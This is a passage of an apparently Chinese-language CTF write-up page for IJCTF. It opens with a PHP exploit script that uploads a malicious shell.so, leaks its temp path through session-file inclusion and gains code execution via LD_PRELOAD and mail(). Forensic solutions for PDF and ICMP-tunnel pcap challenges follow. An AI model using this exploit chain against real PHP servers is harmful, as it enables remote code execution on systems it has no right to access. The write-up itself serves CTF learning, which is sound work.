class="string">&quot;timeout&quot;</span> =&gt; <span class="number">3.0</span></span><br><span class="line">));</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$client</span>-&gt;post(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;chance&quot;</span> =&gt; <span class="string">&quot;for(;;)&#123;&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span> =&gt; <span class="string">&quot;chance&quot;</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;multipart&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;N&quot;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;file&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; Psr7\Utils::tryFopen(<span class="string">&quot;./shell.so&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">                <span class="string">&quot;filename&quot;</span> =&gt; <span class="string">&quot;shell.so&quot;</span></span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;headers&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span> =&gt; <span class="string">&quot;PHPSESSID=exp1;&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;bonus&quot;</span> =&gt; <span class="string">&quot;/var/lib/php/sessions/sess_exp1&quot;</span></span><br><span class="line">    )</span><br><span class="line">));</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody()-&gt;getContents();</span><br><span class="line"><span class="variable">$content</span> = str_replace(<span class="string">&quot;Welcome!!upload_progress_N|&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$tmpLibName</span> = unserialize(<span class="variable">$content</span>)[<span class="string">&quot;files&quot;</span>][<span class="number">0</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tmpLibName</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$client</span>-&gt;post(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;chance&quot;</span> =&gt; <span class="string">&#x27;for(;;)&#123;&#125;&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span> =&gt; <span class="string">&quot;chance&quot;</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;multipart&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;&lt;?php putenv(\&quot;LD_PRELOAD=<span class="subst">$tmpLibName</span>\&quot;); mail(\&quot;\&quot;, \&quot;\&quot;, \&quot;\&quot;, \&quot;\&quot;); ?&gt;&quot;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;file&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                <span class="string">&quot;filename&quot;</span> =&gt; <span class="string">&quot;none.so&quot;</span></span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;headers&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span> =&gt; <span class="string">&quot;PHPSESSID=exp2;&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;bonus&quot;</span> =&gt; <span class="string">&quot;/var/lib/php/sessions/sess_exp2&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到 shell 後執行根目錄下的 flag 檔案即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ijctf&#123;the_memories_from_the_past&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Riddle-Joker"><a href="#Riddle-Joker" class="headerlink" title="Riddle Joker"></a>Riddle Joker</h3><blockquote>
+<p>Joker has returned from his imprisonment. Rumour says that he’s scheming a new evil operation by implanting several bombs at a local bank. Each of bomb has a tag information that might be a clue for finding Joker’s secret.</p>
+<p>Author: <code>Avilia#1337</code></p>
+</blockquote>
+<p>將附件中的 PDF 檔案用 010 Editor 開啟，可以發現在 690 流的地方有一個嵌入檔案。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">78 9C 0B F0 66 66 11 61 66 64 60 60 F0 6C FB 12</span><br><span class="line">B4 5C 22 90 C5 04 C8 D6 00 62 0E 20 4E CB 49 4C</span><br><span class="line">D7 2B A9 28 39 51 29 77 66 1E AF 6A DC E6 3D A7</span><br><span class="line">E7 88 76 0A 88 AD FA 22 BA EC D9 FD D6 FB 79 75</span><br><span class="line">91 1A BF 2A E6 3F 2F BF D0 D3 3C C3 AE 68 95 CD</span><br><span class="line">DA 3B 8D 9F 5E 2E 6A 7F D7 7E FB 41 80 37 23 93</span><br><span class="line">3D 33 2E B3 55 18 20 40 A1 61 4B 23 03 92 4D 5C</span><br><span class="line">0C 0A 60 71 46 06 09 86 86 4B 0C 4B 7D 6A AF 33</span><br><span class="line">A2 D3 01 DE AC 6C 10 35 8C 0C 51 40 3A 0A AC 03</span><br><span class="line">00 B9 35 3B 19</span><br></pre></td></tr></table></figure>
+
+<p>將其用 zlib 解壓一次可以發現是一個壓縮文件，其中包含帶密碼的 flag.txt。在 PDF 檔案中能發現很多 xref，還有 imagemagick 的標識，猜測其中有很多張圖片，同時可以發現 Coordinate 的字樣，可以發現許多座標。透過搜尋可以發現如下參考文件，使用其中的工具構造如下指令碼還原圖片。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.didierstevens.com/2008/05/07/solving-a-little-pdf-puzzle/">https://blog.didierstevens.com/2008/05/07/solving-a-little-pdf-puzzle/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.didierstevens.com/2021/01/31/new-tool-pdftool-py/">https://blog.didierstevens.com/2021/01/31/new-tool-pdftool-py/</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">500</span>, <span class="number">500</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    os.system(<span class="string">f&quot;python3 pdftool.py iu secret.pdf -s<span class="subst">&#123;x&#125;</span> -d &gt; tmp.pdf&quot;</span>)</span><br><span class="line">    x, y = os.popen(<span class="string">f&quot;exiftool -Coordinate tmp.pdf&quot;</span>).read().split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>].strip().split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span> image&quot;</span>)</span><br><span class="line">    os.system(<span class="string">f&quot;convert tmp.pdf -colorspace RGB tmp.png&quot;</span>) <span class="comment"># imagemagick</span></span><br><span class="line">    smallImage = Image.<span class="built_in">open</span>(<span class="string">&quot;tmp.png&quot;</span>)</span><br><span class="line">    image.paste(smallImage, (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)))</span><br><span class="line">    smallImage.close()</span><br><span class="line">image.save(<span class="string">&quot;this.png&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>執行指令碼可以得到如下二維碼圖片。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627385844898360/411d16e19dfc8033c510d77994c0a67e59a61c02.png@100w"></p>
+<p>使用工具讀取該二維碼內容可得如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The passcode is sup3r__cred3nti4l_p4sscode_3da748</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>sup3r__cred3nti4l_p4sscode_3da748</code> 解壓壓縮文件可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;4bbffb87ecc31ba242772ab1f14f569c&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><blockquote>
+<p>A robber broke into a our vault in the middle of night. There’s an indication that the robber tried to steal some items which are considered as a confidential asset. Could you figured it out?</p>
+<p>Flag format: <code>IJCTF&#123;[a-f0-9]&#123;32&#125;&#125;</code></p>
+<p>Author: <code>Avilia#1337</code></p>
+<p>When incident happened, the attacker got into our <code>IP over ICMP</code> tunnel network to access <code>HTTP/2</code> web-server with <code>SSL</code> enabled</p>
+<p>Even so, our captured logs aren’t precise enough. Each packet has an unusual timestamp and it’s kinda messsy…</p>
+</blockquote>
+<h4 id="流量包處理"><a href="#流量包處理" class="headerlink" title="流量包處理"></a>流量包處理</h4><p>根據提示可知流量包中的流量的時間戳有些問題，因此可以使用 Wireshark 自帶的工具先對流量進行排序。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reordercap</span> log.pcap log_ordered.pcap</span><br></pre></td></tr></table></figure>
+
+<p>對排好序的流量包進行分析，可以發現大部分都是 ICMP 流量，還有一些是 IPv4 的資料。對其進行分析可以發現兩個 IPv4 中夾雜著一段資料，搜尋之後可以找到一個用於使用 ICMP 進行通訊的工具 Hans。嘗試將 Hans 插入的資料刪除，恢復原本的結構。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/friedrich/hans">https://github.com/friedrich/hans</a></p>
+</blockquote>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627393585872788/6d42abe0873a356c246805386df413313aa7304c.png"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.wireshark.org/docs/man-pages/editcap.html">https://www.wireshark.org/docs/man-pages/editcap.html</a></p>
+</blockquote>
+<p>使用 Wireshark 的 editcap 工具對資料進行編輯，刪除 Hans 插入的 33 個位元組資料。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$editcap</span> -C 15:33 .\log_ordered.pcap .\log_processed.pcap</span><br></pre></td></tr></table></figure>
+
+<p>開啟處理好的流量包，可以發現一些 Socks 和 TCP 流量，根據提示將 Socks 流量重新設定解碼為 TLS。跟蹤 TCP 流到 0 可以發現傳輸的 SSL Key Log file。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627394559649768/b9ac84b81dcff4e6d1cedebd96b2f292301a210d.png"></p>
+<p>將其匯出後儲存為檔案，將部分換行符修正為空格，匯入到 Wireshark 中解密 TLS 流量。</p>
+<h4 id="HTTP2-流量的分析"><a href="#HTTP2-流量的分析" class="headerlink" title="HTTP2 流量的分析"></a>HTTP2 流量的分析</h4><p>解密的 TLS 流量中有很多含有 data 和 content-range 的資料傳輸。將 SSL Key Log file 注入進檔案中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$editcap</span> --inject-secrets tls,sslkeylogfile log_processed.pcap log_decrypted.pcap</span><br></pre></td></tr></table></figure>
+
+<p>將流量中含有的 data 和對應部分的 range 取出，使用如下的 CyberChef  Receipt 處理。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tshark</span> -r ./log_decrypted.pcap -Y <span class="string">&quot;http2&quot;</span> -T fields -e http2.headers.range -e http2.data.data &gt; data.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;^(bytes.*)\\n&#39;&#125;,&#39;$1&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\t\\n|bytes&#x3D;&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\t\\t|-&#39;&#125;,&#39;,&#39;,true,false,true,false)</span><br></pre></td></tr></table></figure>
+
+<p>將得到的資料使用 Excel 對兩位和四位長度的資料分別排序後匯出，再 <code>From Hex</code> 處理一次可以得到一個字串 <code>0edbca2531daefac9c5c84c016792713fd23681ea8bc1b3d088b617f75940313</code> 和一個壓縮包。使用該字串作為壓縮包的密碼將其解壓可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;aa51f2cc8eaf466a277da70db3a3c576&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SodaFactory"><span class="toc-number">1.1.</span> <span class="toc-text">SodaFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memory"><span class="toc-number">1.2.</span> <span class="toc-text">Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BD%88-shell-%E7%9A%84%E6%A7%8B%E9%80%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">反彈 shell 的構造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensic"><span class="toc-number">2.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 